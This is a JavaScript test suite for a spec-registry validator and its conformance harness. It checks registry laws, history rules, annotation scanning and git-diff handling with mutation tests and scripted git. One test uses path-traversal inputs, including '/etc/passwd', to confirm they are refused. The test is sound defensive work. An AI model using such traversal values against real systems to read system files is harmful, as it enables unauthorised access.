/**
 * The spec registry under its own laws (spec/spec-anchored-development.md §4, §5, §6a, §6c).
 *
 * The first test IS the CI wiring §10 asks for: it validates the real registry against the real
 * spec document, so any divergence fails the root battery with exit 1 — no workflow edit needed.
 * Every law is then proven by mutation: a registry the law should refuse is refused by name.
 * The conformance harness is proven against a SCRIPTED runner and against a real fixture file,
 * including the case node would silently bless: a named test that no longer exists.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { execFileSync } from 'node:child_process';
import {
  loadSpecSources, validateSpecRegistry, parseSpecTables, runConformance,
  assertConformTarget, assertChildBoundary, annotationOffenses, CHECK_TIMEOUT_MS, CONFORM_TEST_TIMEOUT_MS,
  resolvePreviousRegistryRaw, governedPathOffenses, diffChangedFiles, runConformanceForCommit,
  SpecRegistryError, REGISTRY_PATH, SPEC_PATH,
} from '../src/lib/spec-registry.js';
import { framedTextDigest } from '../src/lib/authority-policy.js';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const SOURCES = loadSpecSources({ root: ROOT });
const REGISTRY = JSON.parse(SOURCES.registryRaw);

/** Mutate a deep copy of the registry (and optionally the spec text), expect a named refusal. */
function expectRejected(mutate, expected) {
  const registry = structuredClone(REGISTRY);
  let specMd = SOURCES.specMd;
  const setSpec = (next) => { specMd = next; };
  mutate(registry, setSpec);
  assert.throws(
    () => validateSpecRegistry({ registryRaw: JSON.stringify(registry), specMd, fileExists: SOURCES.fileExists, readFile: SOURCES.readFile, isRegularTrackedFile: SOURCES.isRegularTrackedFile }),
    (err) => {
      assert.ok(err instanceof SpecRegistryError, `expected SpecRegistryError, got ${err}`);
      assert.match(err.message, expected, `unexpected reason: ${err.message}`);
      return true;
    },
  );
}

const entry = (registry, id) => registry.entries.find((e) => e.id === id);

test('CI WIRING: the real registry validates against the real spec document', () => {
  const registry = validateSpecRegistry(SOURCES);
  assert.equal(registry.entries.length, 56);
  const counts = { PROPOSED: 0, ACTIVE: 0, RETIRED: 0 };
  for (const e of registry.entries) counts[e.status] += 1;
  // Slice I8: the first activation batch — everything else stays PROPOSED until its own
  // activation commit satisfies its own predicates (§4). TWO ids are RETIRED by
  // before-activation absorption: -020 (design round 5) and -002 (Slice I4).
  assert.deepEqual(counts, { PROPOSED: 52, ACTIVE: 2, RETIRED: 2 });
  assert.deepEqual(registry.entries.filter((e) => e.status === 'ACTIVE').map((e) => e.id).sort(), ['SPEC-DEPLOY-016', 'SPEC-DEPLOY-021']);
  const retiredIds = registry.entries.filter((e) => e.status === 'RETIRED').map((e) => e.id).sort();
  assert.deepEqual(retiredIds, ['SPEC-DEPLOY-002', 'SPEC-DEPLOY-020']);
  for (const id of retiredIds) assert.equal(entry(registry, id).supersededBy, 'SPEC-DEPLOY-019');
  // Round I1-2: supersedes is a LIST, and reciprocity is checkable only when the absorbing side
  // names everything it covers.
  assert.deepEqual(entry(registry, 'SPEC-DEPLOY-019').supersedes, ['SPEC-DEPLOY-002', 'SPEC-DEPLOY-020']);
});

test('CI WIRING: conformance sees the ACTIVE set, and the zero-ACTIVE honesty path stays exact', () => {
  // Slice I8: the real registry now carries 2 ACTIVE ids with 4 named tests — EXECUTING them is
  // spec:conform's job (it runs in the battery and in CI); this unit asserts the shape without
  // spawning nested suites. The zero-ACTIVE honesty message stays proven on the same machinery
  // by filtering the ACTIVE set out.
  const registry = validateSpecRegistry(SOURCES);
  const active = registry.entries.filter((e) => e.status === 'ACTIVE');
  assert.deepEqual(active.map((e) => e.id).sort(), ['SPEC-DEPLOY-016', 'SPEC-DEPLOY-021']);
  assert.equal(active.flatMap((e) => e.tests).length, 4, 'four named tests are what conformance enforces');
  const zeroActive = runConformance({ entries: registry.entries.filter((e) => e.status !== 'ACTIVE') });
  assert.deepEqual(zeroActive, { activeCount: 0, results: [], ok: true });
});

test('ROUND I8-2: an ACTIVE anchor without its token, or outside its own governedPaths, refuses', () => {
  // The gap Codex found in I8: -021 activated with a new JS anchor that had no bracketed token
  // and no governedPath coverage — complete traceability is an ACTIVATION predicate, not a
  // convention. Both directions of the generic law, proven refusing:
  expectRejected((r) => {
    // an anchor pointing at a real non-JSON file that carries no [SPEC-DEPLOY-021] token
    entry(r, 'SPEC-DEPLOY-021').anchors.push({ file: 'bin/resolve-run.mjs', symbol: null });
  }, /carries no bracketed .SPEC-DEPLOY-021. annotation/);
  expectRejected((r) => {
    const e = entry(r, 'SPEC-DEPLOY-021');
    e.governedPaths = e.governedPaths.filter((g) => g !== 'infra/aws/bin/deploy-release.js');
  }, /outside its own governedPaths/);
});

test('the id law: format, uniqueness, and never-reused ids', () => {
  expectRejected((r) => { entry(r, 'SPEC-GOV-001').id = 'SPEC-GOV-1'; }, /does not match/);
  expectRejected((r) => { entry(r, 'SPEC-GOV-001').id = 'SPEC-NEW-001'; }, /does not match/);
  expectRejected((r) => { entry(r, 'SPEC-GOV-002').id = 'SPEC-GOV-001'; }, /appears twice; ids are never reused/);
});

test('the schema is closed: unknown and missing keys are refused', () => {
  expectRejected((r) => { entry(r, 'SPEC-GOV-001').extra = true; }, /extra: \[extra\]/);
  expectRejected((r) => { delete entry(r, 'SPEC-GOV-001').mutationEvidence; }, /missing: \[mutationEvidence\]/);
  expectRejected((r) => { r.entries[0].anchors[0].line = 12; }, /anchor.*extra: \[line\]/);
});

test('the digest law: normativeSha256 is recomputed, never trusted', () => {
  // Editing the text without re-digesting refuses…
  expectRejected((r) => { entry(r, 'SPEC-GOV-001').normativeText += ' — amended'; }, /does not match the §6b text-framed digest/);
  // …and so does a raw sha256 of the text, the round-9 lesson applied to the registry.
  expectRejected((r) => {
    const e = entry(r, 'SPEC-GOV-001');
    e.normativeSha256 = 'a'.repeat(64);
  }, /§6b text-framed digest/);
  // The framing binds the ID as subject: the same sentence under another id digests differently.
  const e = REGISTRY.entries[0];
  assert.notEqual(framedTextDigest('SPEC-GOV-999', e.normativeText), e.normativeSha256);
});

test('the table-agreement law fails in BOTH directions', () => {
  // Registry says something the table does not…
  expectRejected((r, setSpec) => {
    const e = entry(r, 'SPEC-GOV-001');
    e.normativeText = 'a quietly different sentence';
    e.normativeSha256 = framedTextDigest(e.id, e.normativeText);
  }, /normative text disagrees/);
  // …status drift is drift…
  expectRejected((r) => { entry(r, 'SPEC-GOV-001').status = 'ACTIVE'; }, /status disagrees|ACTIVE with no test anchor/);
  // …a registry id the tables never defined…
  expectRejected((r) => {
    const clone = structuredClone(entry(r, 'SPEC-GOV-001'));
    clone.id = 'SPEC-GOV-099';
    clone.normativeSha256 = framedTextDigest(clone.id, clone.normativeText);
    r.entries.push(clone);
  }, /in the registry but not in the spec tables/);
  // …and a table row the registry dropped.
  expectRejected((r) => {
    r.entries = r.entries.filter((e) => e.id !== 'SPEC-GOV-001');
  }, /in the spec tables but not in the registry/);
});

test('the lifecycle law: what ACTIVE must carry, what RETIRED must name', () => {
  const activate = (r, id) => {
    const e = entry(r, id);
    e.status = 'ACTIVE';
    // keep the table agreeing so the ACTIVATION laws are what refuses, not table drift
    return e;
  };
  // ACTIVE with a file-only test ref refuses: §5 requires the exact tests.
  expectRejected((r, setSpec) => {
    const e = activate(r, 'SPEC-DEPLOY-001');
    setSpec(SOURCES.specMd.replace('| SPEC-DEPLOY-001 | PROPOSED |', '| SPEC-DEPLOY-001 | ACTIVE |'));
    assert.ok(e.tests.length > 0);
  }, /ACTIVE but a test names only a file/);
  // ACTIVE with prose mutation evidence refuses: §6c is a closed record.
  expectRejected((r, setSpec) => {
    const e = activate(r, 'SPEC-DEPLOY-001');
    setSpec(SOURCES.specMd.replace('| SPEC-DEPLOY-001 | PROPOSED |', '| SPEC-DEPLOY-001 | ACTIVE |'));
    e.tests = e.tests.map((t) => ({ ...t, title: 'some exact test name' }));
  }, /mutationEvidence must be an object|closed key set/);
  // ACTIVE with no anchors refuses — anchors stripped in the same mutation, so THIS law is the
  // one that fires (Slice I4 gave -019 real anchors, so it no longer serves as the fixture).
  expectRejected((r, setSpec) => {
    const e = activate(r, 'SPEC-DEPLOY-001');
    e.anchors = [];
    e.governedPaths = [];
    setSpec(SOURCES.specMd.replace('| SPEC-DEPLOY-001 | PROPOSED |', '| SPEC-DEPLOY-001 | ACTIVE |'));
  }, /ACTIVE with no code anchor/);
  // RETIRED without a successor refuses: retirement is never a quiet delete (§4).
  expectRejected((r) => { entry(r, 'SPEC-DEPLOY-020').supersededBy = null; }, /RETIRED without supersededBy/);
  // A dangling supersession refuses in either field.
  expectRejected((r) => { entry(r, 'SPEC-DEPLOY-020').supersededBy = 'SPEC-DEPLOY-099'; }, /references unregistered id/);
  expectRejected((r) => { entry(r, 'SPEC-DEPLOY-019').supersedes = ['SPEC-DEPLOY-098']; }, /references unregistered id|does not name/);
  expectRejected((r) => { entry(r, 'SPEC-DEPLOY-019').supersedes = ['SPEC-DEPLOY-019']; }, /cannot reference itself/);
  // ROUND I1-2 (Codex's exact reproduction): a supersededBy aimed at an unrelated id refuses,
  // because supersession is reciprocal or it is nothing.
  expectRejected((r) => { entry(r, 'SPEC-DEPLOY-020').supersededBy = 'SPEC-GOV-001'; }, /does not name SPEC-DEPLOY-020 back/);
});

test('anchors and governed paths must exist in the tree being linted', () => {
  expectRejected((r) => { entry(r, 'SPEC-DEPLOY-001').anchors[0].file = 'infra/aws/bin/nope.js'; }, /anchor file does not exist/);
  expectRejected((r) => { entry(r, 'SPEC-DEPLOY-001').tests[0].file = 'infra/aws/test/nope.test.js'; }, /test file does not exist/);
  expectRejected((r) => { entry(r, 'SPEC-DEPLOY-001').governedPaths = ['no/such/path.js']; }, /governed path does not exist/);
});

test('loadSpecSources refuses a moving target for --commit', () => {
  for (const bad of ['HEAD', 'main', 'd'.repeat(39), 'D'.repeat(40)]) {
    assert.throws(() => loadSpecSources({ commit: bad }), /full lowercase 40-character SHA/);
  }
});

test('the conformance harness: pass, fail, and the silently-missing test', () => {
  // A scripted registry with one ACTIVE id pointing at the real fixture file.
  const fixtureFile = 'test/fixtures/conform-probe.js';
  const scripted = (title) => ({
    entries: [{
      id: 'SPEC-GOV-001',
      status: 'ACTIVE',
      tests: [{ file: fixtureFile, title }],
    }],
  });
  // The real default runner, against the real fixture: the passing test passes…
  const pass = runConformance(scripted('conform probe: this test passes'));
  assert.equal(pass.ok, true);
  assert.equal(pass.results.length, 1);
  // …the failing test fails with the run's own evidence…
  const failRun = runConformance(scripted('conform probe: this test fails'));
  assert.equal(failRun.ok, false);
  assert.equal(failRun.results[0].reason, 'CONFORM_TEST_FAILED');
  // …and a test that DOES NOT EXIST is a failure, not a silent pass — node exits 0 when the
  // pattern matches nothing, which is exactly the drift conformance exists to catch.
  const missing = runConformance(scripted('conform probe: no such test'));
  assert.equal(missing.ok, false);
  assert.equal(missing.results[0].reason, 'CONFORM_TEST_NOT_FOUND');
});

test('the conformance runner is injectable and reports per named test', () => {
  const calls = [];
  const registry = {
    entries: [
      { id: 'SPEC-A-001', status: 'ACTIVE', tests: [{ file: 'a.test.js', title: 't1' }, { file: 'b.test.js', title: 't2' }] },
      { id: 'SPEC-A-002', status: 'PROPOSED', tests: [{ file: 'c.test.js', title: 'never-run' }] },
    ],
  };
  const report = runConformance(registry, {
    runTests: (file, title) => {
      calls.push([file, title]);
      return title === 't2' ? { ok: false, reason: 'CONFORM_TEST_FAILED' } : { ok: true };
    },
  });
  // PROPOSED ids are never executed: CI enforces ACTIVE only (§4).
  assert.deepEqual(calls, [['a.test.js', 't1'], ['b.test.js', 't2']]);
  assert.equal(report.ok, false);
  assert.equal(report.activeCount, 1);
});

test('parseSpecTables reads exactly the SPEC rows, statuses parsed from the leading token', () => {
  const rows = parseSpecTables(SOURCES.specMd);
  assert.equal(rows.length, 56);
  assert.ok(rows.every((r) => /^SPEC-(GOV|AUDIT|RUN|DEPLOY|LANE|IAM)-[0-9]{3}$/.test(r.id)));
  const d20 = rows.find((r) => r.id === 'SPEC-DEPLOY-020');
  assert.equal(d20.status, 'RETIRED');
});

test('ROUND I1-2: the historical laws — nothing deleted, ACTIVE immutable, RETIRED permanent', () => {
  const validateWithHistory = (previous, mutate) => {
    const registry = structuredClone(REGISTRY);
    if (mutate) mutate(registry);
    return () => validateSpecRegistry({
      registryRaw: JSON.stringify(registry),
      specMd: SOURCES.specMd,
      fileExists: SOURCES.fileExists,
      readFile: SOURCES.readFile,
      previousRegistryRaw: JSON.stringify(previous),
    });
  };
  // The committed registry against itself is clean history.
  assert.doesNotThrow(validateWithHistory(REGISTRY, null));
  // A deleted id refuses even when BOTH current surfaces agree it is gone — Codex's reproduction:
  // remove from registry AND table, count drops to 55, and before this law that validated.
  {
    const registry = structuredClone(REGISTRY);
    registry.entries = registry.entries.filter((e) => e.id !== 'SPEC-GOV-001');
    const specMd = SOURCES.specMd.split('\n').filter((l) => !l.startsWith('| SPEC-GOV-001 |')).join('\n');
    assert.throws(
      () => validateSpecRegistry({ registryRaw: JSON.stringify(registry), specMd, fileExists: SOURCES.fileExists, readFile: SOURCES.readFile, previousRegistryRaw: JSON.stringify(REGISTRY) }),
      /existed in the committed registry and is gone; ids are never deleted/,
    );
  }
  // An ACTIVE text edited with digest AND table kept consistent refuses against history — the
  // other reproduction: all three current surfaces agreed, and only the past disagreed.
  {
    const previous = structuredClone(REGISTRY);
    const pe = previous.entries.find((e) => e.id === 'SPEC-DEPLOY-001');
    pe.status = 'ACTIVE';
    const registry = structuredClone(REGISTRY);
    const ce = registry.entries.find((e) => e.id === 'SPEC-DEPLOY-001');
    ce.status = 'ACTIVE';
    ce.normativeText = 'a quietly rewritten obligation';
    ce.normativeSha256 = framedTextDigest(ce.id, ce.normativeText);
    ce.tests = ce.tests.map((t) => ({ ...t, title: 'x' }));
    ce.mutationEvidence = { commit: 'a'.repeat(40), patchSha256: 'b'.repeat(64), command: 'npm test', expectedFailure: '1 test' };
    const specMd = SOURCES.specMd
      .replace('| SPEC-DEPLOY-001 | PROPOSED |', '| SPEC-DEPLOY-001 | ACTIVE |')
      .replace(/^\| SPEC-DEPLOY-001 \| ACTIVE \| [^|]+\|/m, `| SPEC-DEPLOY-001 | ACTIVE | ${ce.normativeText} |`);
    assert.throws(
      () => validateSpecRegistry({ registryRaw: JSON.stringify(registry), specMd, fileExists: SOURCES.fileExists, readFile: SOURCES.readFile, previousRegistryRaw: JSON.stringify(previous) }),
      /ACTIVE and its normative text changed|status disagrees/,
    );
  }
  // ACTIVE cannot quietly become PROPOSED; RETIRED is permanent in status, successor and text.
  {
    const previous = structuredClone(REGISTRY);
    previous.entries.find((e) => e.id === 'SPEC-DEPLOY-020').status = 'RETIRED';
    assert.throws(validateWithHistory(previous, (r) => {
      const e = r.entries.find((x) => x.id === 'SPEC-DEPLOY-020');
      e.status = 'PROPOSED';
      e.supersededBy = null;
    }), /was RETIRED and changed status|RETIRED without supersededBy|status disagrees/);
  }
});

test('ROUND I1-2: conformance for a commit requires the worktree to BE that commit', () => {
  const HEAD = 'a'.repeat(40);
  const scripted = ({ head = HEAD, status = '' } = {}) => (cmd, args) => {
    assert.equal(cmd, 'git');
    if (args[0] === 'rev-parse') return `${head}\n`;
    if (args[0] === 'status') return status;
    throw new Error(`unexpected git call: ${args.join(' ')}`);
  };
  assert.doesNotThrow(() => assertConformTarget({ commit: HEAD, git: scripted() }));
  // A fixed worktree cannot lend its green to a broken audited commit…
  assert.throws(
    () => assertConformTarget({ commit: 'b'.repeat(40), git: scripted() }),
    /CONFORM_HEAD_MISMATCH/,
  );
  // …and a dirty tree is not the audited commit either.
  assert.throws(
    () => assertConformTarget({ commit: HEAD, git: scripted({ status: ' M src/lib/spec-registry.js\n' }) }),
    /CONFORM_WORKTREE_DIRTY/,
  );
});

test('ROUND I1-2: checks are obligations — a failing check fails conformance', () => {
  assert.equal(CHECK_TIMEOUT_MS, 60_000);
  const scripted = (checkRef) => ({
    entries: [{
      id: 'SPEC-GOV-001',
      status: 'ACTIVE',
      tests: [{ file: 'test/fixtures/conform-probe.js', title: 'conform probe: this test passes' }],
      checks: [{ kind: 'script', ref: checkRef }],
    }],
  });
  // Codex's reproduction, inverted: passing test + failing check is FAIL, not PASS.
  const failing = runConformance(scripted('test/fixtures/check-fail.sh'));
  assert.equal(failing.ok, false);
  assert.equal(failing.results.find((r) => r.kind === 'check').reason, 'CONFORM_CHECK_FAILED');
  const passing = runConformance(scripted('test/fixtures/check-pass.sh'));
  assert.equal(passing.ok, true);
  assert.equal(passing.results.length, 2);
});

test('ROUND I1-2: annotations resolve or offend — the third traceability direction', () => {
  const ids = new Set(REGISTRY.entries.map((e) => e.id));
  // The REAL tree, today: whatever annotations exist must resolve (currently none).
  assert.deepEqual(annotationOffenses({ registryIds: ids }), []);
  // A scripted grep with an unregistered annotation offends; a registered one does not.
  // Tokens are assembled at runtime so this file passes the real scan above.
  const token = (id) => `[${id}]`;
  const scripted = (line) => (cmd, args) => {
    assert.equal(args[0], 'grep');
    return `${line}\n`;
  };
  assert.equal(
    annotationOffenses({ registryIds: ids, git: scripted(`src/x.js:12: // ${token('SPEC-GOV-001')}`) }).length,
    0,
  );
  const offenses = annotationOffenses({ registryIds: ids, git: scripted(`src/x.js:12: // ${token('SPEC-GOV-999')}`) });
  assert.equal(offenses.length, 1);
  assert.match(offenses[0], /unregistered SPEC-GOV-999/);
});

test('ROUND I1-2: paths are repo-relative and normalized — escapes and traversals refuse', () => {
  for (const bad of ['../cba-issue-91/package.json', '/etc/passwd', 'a/../b.js', './x.js', 'a//b.js']) {
    expectRejected((r) => { entry(r, 'SPEC-DEPLOY-001').anchors[0].file = bad; }, /normalized repo-relative path/);
  }
});

test('ROUND I1-2: an ACTIVE anchor symbol must actually appear in its file', () => {
  expectRejected((r, setSpec) => {
    const e = entry(r, 'SPEC-DEPLOY-001');
    e.status = 'ACTIVE';
    e.tests = e.tests.map((t) => ({ ...t, title: 'x' }));
    e.mutationEvidence = { commit: 'a'.repeat(40), patchSha256: 'b'.repeat(64), command: 'npm test', expectedFailure: '1 test' };
    e.anchors = [{ file: 'infra/aws/bin/deploy-release.js', symbol: 'THIS_SYMBOL_DOES_NOT_EXIST' }];
    setSpec(SOURCES.specMd.replace('| SPEC-DEPLOY-001 | PROPOSED |', '| SPEC-DEPLOY-001 | ACTIVE |'));
  }, /does not appear in/);
});

test('ROUND I1-3: the history baseline is never the bytes under validation', () => {
  const HEAD_RAW = '{"head":true}';
  const PARENT_RAW = '{"parent":true}';
  const PARENT_SHA = 'p'.repeat(40);
  // A scripted history that answers the PROOF calls: shallow probe, ls-tree presence, show
  // content, parent enumeration. `head`/`parent` null means "file proven absent there";
  // `parents: []` means a proven root commit; a function response simulates git breaking.
  const scripted = ({ head = HEAD_RAW, parent = PARENT_RAW, shallow = 'false', parents = [PARENT_SHA], breakShow = false } = {}) => (cmd, args) => {
    if (args[0] === 'rev-parse' && args[1] === '--is-shallow-repository') {
      if (shallow instanceof Error) throw shallow;
      return `${shallow}\n`;
    }
    if (args[0] === 'rev-list') return `${'h'.repeat(40)} ${parents.join(' ')}\n`.trim() + '\n';
    if (args[0] === 'ls-tree') {
      const ref = args[1];
      const value = ref === 'HEAD' ? head : parent;
      return value === null ? '' : `100644 blob abc\t${REGISTRY_PATH}\n`;
    }
    if (args[0] === 'show') {
      if (breakShow) throw new Error('git show broke');
      const value = args[1].startsWith('HEAD:') ? head : parent;
      if (value === null) throw new Error('absent');
      return value;
    }
    throw new Error(`unexpected: ${args.join(' ')}`);
  };
  // Codex's reproduction: clean checkout, worktree === HEAD — the baseline must be the PARENT,
  // never the very bytes being validated.
  assert.equal(resolvePreviousRegistryRaw({ currentRaw: HEAD_RAW, git: scripted() }), PARENT_RAW);
  // A diverged worktree is judged against HEAD.
  assert.equal(resolvePreviousRegistryRaw({ currentRaw: '{"edited":true}', git: scripted() }), HEAD_RAW);
  // Birth commits have no baseline — in either direction.
  assert.equal(resolvePreviousRegistryRaw({ currentRaw: HEAD_RAW, git: scripted({ head: null }) }), null);
  assert.equal(resolvePreviousRegistryRaw({ currentRaw: HEAD_RAW, git: scripted({ parent: null }) }), null);
  // Round I1-4: the shallow-clone hazard — absent history must be PROVEN absent, never assumed.
  assert.throws(
    () => resolvePreviousRegistryRaw({ currentRaw: HEAD_RAW, git: scripted({ shallow: 'true' }) }),
    /HISTORY_TRUNCATED/,
  );
  // ROUND I1-5: a git FAILURE is never absence. The shallow probe breaking, and `show` breaking
  // for a file ls-tree just listed, each refuse by name in a NON-shallow repository.
  assert.throws(
    () => resolvePreviousRegistryRaw({ currentRaw: HEAD_RAW, git: scripted({ shallow: new Error('rev-parse broke') }) }),
    /HISTORY_UNPROVABLE: could not determine whether this clone is shallow/,
  );
  assert.throws(
    () => resolvePreviousRegistryRaw({ currentRaw: HEAD_RAW, git: scripted({ breakShow: true }) }),
    /HISTORY_UNPROVABLE: .* could not be read/,
  );
  // A PROVEN root commit, and a file PROVEN absent at the parent, are the only legitimate nulls.
  assert.equal(resolvePreviousRegistryRaw({ currentRaw: HEAD_RAW, git: scripted({ parents: [] }) }), null);
  assert.equal(resolvePreviousRegistryRaw({ currentRaw: HEAD_RAW, git: scripted({ parent: null }) }), null);
  // …and the REAL loader's baseline is tested by PROVENANCE, not by content inequality: a commit
  // that does not touch the registry legitimately has parent bytes equal to the current bytes
  // (round I1-4 corrected the previous assertion, which failed exactly on such a commit). The
  // baseline must be WHAT THE RIGHT SOURCE HOLDS, whatever those bytes are.
  const real = loadSpecSources({ root: ROOT });
  const headRaw = execFileSync('git', ['-C', ROOT, 'show', `HEAD:${REGISTRY_PATH}`], { encoding: 'utf8' });
  if (real.registryRaw !== headRaw) {
    assert.equal(real.previousRegistryRaw, headRaw, 'diverged worktree is judged against HEAD');
  } else {
    let parentRaw = null;
    try {
      parentRaw = execFileSync('git', ['-C', ROOT, 'show', `HEAD~1:${REGISTRY_PATH}`], { encoding: 'utf8' });
    } catch {
      parentRaw = null;
    }
    assert.equal(real.previousRegistryRaw, parentRaw, 'clean checkout is judged against the parent, whatever its bytes');
  }
});

test('ROUND I1-3: retiring an ACTIVE id is not a license to rewrite its text', () => {
  // Synthetic history: -002 ACTIVE in the committed past; the current tree keeps it RETIRED (as
  // it really is since I4) but with a REWRITTEN text — the exact laundering the law refuses.
  const previous = structuredClone(REGISTRY);
  previous.entries.find((e) => e.id === 'SPEC-DEPLOY-002').status = 'ACTIVE';
  const registry = structuredClone(REGISTRY);
  const ce = registry.entries.find((e) => e.id === 'SPEC-DEPLOY-002');
  ce.normativeText = 'a rewritten record';
  ce.normativeSha256 = framedTextDigest(ce.id, ce.normativeText);
  const d19 = registry.entries.find((e) => e.id === 'SPEC-DEPLOY-019');
  d19.status = 'ACTIVE';
  d19.tests = [{ file: 'test/fixtures/conform-probe.js', title: 'conform probe: this test passes' }];
  d19.mutationEvidence = { commit: 'a'.repeat(40), patchSha256: 'b'.repeat(64), command: 'npm test', expectedFailure: '1' };
  const specMd = SOURCES.specMd
    .replace(/^\| SPEC-DEPLOY-002 \| RETIRED[^|]*\| [^|]+\|/m, `| SPEC-DEPLOY-002 | RETIRED | ${ce.normativeText} |`)
    .replace('| SPEC-DEPLOY-019 | PROPOSED (absorbed -002 and -020) |', '| SPEC-DEPLOY-019 | ACTIVE |');
  assert.throws(
    () => validateSpecRegistry({ registryRaw: JSON.stringify(registry), specMd, fileExists: SOURCES.fileExists, readFile: SOURCES.readFile, previousRegistryRaw: JSON.stringify(previous) }),
    /text changed during retirement|is not RETIRED naming it back|RETIRED and its normative text changed/,
  );
});

test('ROUND I1-3: the annotation scan fails closed and refuses malformed tokens', () => {
  const ids = new Set(REGISTRY.entries.map((e) => e.id));
  const token = (inner) => `[${inner}]`;
  const grepLine = (line) => (cmd, args) => {
    assert.equal(args[0], 'grep');
    return `${line}\n`;
  };
  // Codex's reproduction 1: a git error is a REFUSAL, never "no annotations".
  const gitError = () => { const err = new Error('not a git repository'); err.status = 128; throw err; };
  assert.throws(() => annotationOffenses({ registryIds: ids, git: gitError }), /ANNOTATION_SCAN_FAILED/);
  // Zero matches (exit 1, empty output) is genuinely clean.
  const noMatch = () => { const err = new Error(''); err.status = 1; err.stdout = ''; throw err; };
  assert.deepEqual(annotationOffenses({ registryIds: ids, git: noMatch }), []);
  // Codex's reproduction 2: a malformed token (two digits) offends instead of vanishing.
  const malformed = annotationOffenses({ registryIds: ids, git: grepLine(`src/x.js:9: // ${token('SPEC-GOV-01')}`) });
  assert.equal(malformed.length, 1);
  assert.match(malformed[0], /malformed SPEC token/);
  // Frontmatter reference LISTS resolve piece by piece; one bad piece offends.
  assert.deepEqual(annotationOffenses({ registryIds: ids, git: grepLine(`docs/x.md:7:specs: ${token('SPEC-GOV-001, SPEC-RUN-001')}`) }), []);
  assert.equal(annotationOffenses({ registryIds: ids, git: grepLine(`docs/x.md:7:specs: ${token('SPEC-GOV-001, SPEC-GOV-999')}`) }).length, 1);
  // Documentation placeholders describe the format without being annotations.
  assert.deepEqual(annotationOffenses({ registryIds: ids, git: grepLine(`spec/x.md:3: the ${token('SPEC-…')} token`) }), []);
  // Commit-bound: the scan targets the named tree-ish, not the ambient worktree.
  let seenArgs = null;
  const capture = (cmd, args) => { seenArgs = args; const err = new Error(''); err.status = 1; err.stdout = ''; throw err; };
  annotationOffenses({ registryIds: ids, git: capture, commit: 'c'.repeat(40) });
  assert.equal(seenArgs[seenArgs.length - 1], 'c'.repeat(40));
});

test('ROUND I1-3: a governed-path change without moving evidence is an offense', () => {
  const registry = {
    entries: [
      {
        id: 'SPEC-A-001',
        status: 'ACTIVE',
        governedPaths: ['infra/aws/bin/deploy-release.js', 'infra/aws/bootstrap/policies/'],
        tests: [{ file: 'infra/aws/test/deploy-preflight.test.js', title: 'x' }],
        checks: [{ kind: 'script', ref: 'spec/checks/a.sh' }],
      },
      { id: 'SPEC-A-002', status: 'PROPOSED', governedPaths: ['infra/aws/bin/deploy-release.js'], tests: [], checks: [] },
    ],
  };
  // Governed file changed, evidence untouched → offense (Codex's activation-gap closed).
  const offenses = governedPathOffenses({ registry, changedFiles: ['infra/aws/bin/deploy-release.js'] });
  assert.equal(offenses.length, 1);
  assert.match(offenses[0], /SPEC-A-001.*evidence must move/s);
  // Directory prefixes cover their children.
  assert.equal(governedPathOffenses({ registry, changedFiles: ['infra/aws/bootstrap/policies/cfn-exec-release.template.json'] }).length, 1);
  // Evidence moving with the change clears it — either a test file or a check ref.
  assert.deepEqual(governedPathOffenses({ registry, changedFiles: ['infra/aws/bin/deploy-release.js', 'infra/aws/test/deploy-preflight.test.js'] }), []);
  assert.deepEqual(governedPathOffenses({ registry, changedFiles: ['infra/aws/bin/deploy-release.js', 'spec/checks/a.sh'] }), []);
  // PROPOSED ids are not enforced; unrelated changes are silent; no baseline means no verdict.
  assert.deepEqual(governedPathOffenses({ registry, changedFiles: ['README.md'] }), []);
  assert.deepEqual(governedPathOffenses({ registry, changedFiles: null }), []);
});

test('ROUND I1-3/4: diffChangedFiles picks the honest baseline and sees BOTH sides of a rename', () => {
  const C = 'c'.repeat(40);
  const P = 'p'.repeat(40);
  const scripted = (responses, { parents = [P] } = {}) => (cmd, args) => {
    const key = args.join(' ');
    if (key === 'rev-parse --is-shallow-repository') return 'false\n';
    if (args[0] === 'rev-list') return `${'h'.repeat(40)} ${parents.join(' ')}`.trim() + '\n';
    if (!(key in responses)) throw new Error(`unexpected: ${key}`);
    const v = responses[key];
    if (v instanceof Error) throw v;
    return v;
  };
  // Commit mode: the commit against its PROVEN parent, name-status parsed.
  assert.deepEqual(
    diffChangedFiles({ commit: C, git: scripted({ [`diff --name-status -M ${P} ${C}`]: 'A\ta.js\nM\tb.md\n' }) }),
    ['a.js', 'b.md'],
  );
  // ROUND I1-4 (Codex's reproduction): a rename reports BOTH paths, so a governed file renamed
  // AWAY still counts as touched.
  assert.deepEqual(
    diffChangedFiles({ commit: C, git: scripted({ [`diff --name-status -M ${P} ${C}`]: 'R097\tsrc/lib/spec-registry.js\tsrc/lib/spec-registry-moved.js\n' }) }),
    ['src/lib/spec-registry.js', 'src/lib/spec-registry-moved.js'],
  );
  // Dirty worktree: worktree vs HEAD, untracked included.
  assert.deepEqual(
    diffChangedFiles({ git: scripted({ 'status --porcelain': ' M a.js\n?? new.md\n', 'diff --name-status -M HEAD': 'M\ta.js\n' }) }),
    ['a.js', 'new.md'],
  );
  // Clean checkout: HEAD against its PROVEN parent — never an empty self-diff.
  assert.deepEqual(
    diffChangedFiles({ git: scripted({ 'status --porcelain': '', [`diff --name-status -M ${P} HEAD`]: 'M\tc.js\n' }) }),
    ['c.js'],
  );
  // Shallow clones refuse instead of degrading to "no baseline".
  assert.throws(
    () => diffChangedFiles({ git: (cmd, args) => (args[1] === '--is-shallow-repository' ? 'true\n' : '') }),
    /HISTORY_TRUNCATED/,
  );
  // ROUND I1-5: a proven ROOT commit is the only legitimate null; a broken diff refuses.
  assert.equal(diffChangedFiles({ commit: C, git: scripted({}, { parents: [] }) }), null);
  assert.throws(
    () => diffChangedFiles({ commit: C, git: scripted({ [`diff --name-status -M ${P} ${C}`]: new Error('diff broke') }) }),
    /HISTORY_UNPROVABLE: git diff failed/,
  );
  // A rename OUT of a governed directory flags the ACTIVE id even though the destination is
  // outside every governed path.
  const registry = {
    entries: [{
      id: 'SPEC-A-001', status: 'ACTIVE', governedPaths: ['infra/aws/bootstrap/policies/'],
      tests: [{ file: 'infra/aws/test/release-bootstrap.test.js', title: 'x' }], checks: [],
    }],
  };
  const offenses = governedPathOffenses({ registry, changedFiles: ['infra/aws/bootstrap/policies/cfn-exec-release.template.json', 'somewhere/else.json'] });
  assert.equal(offenses.length, 1);
});

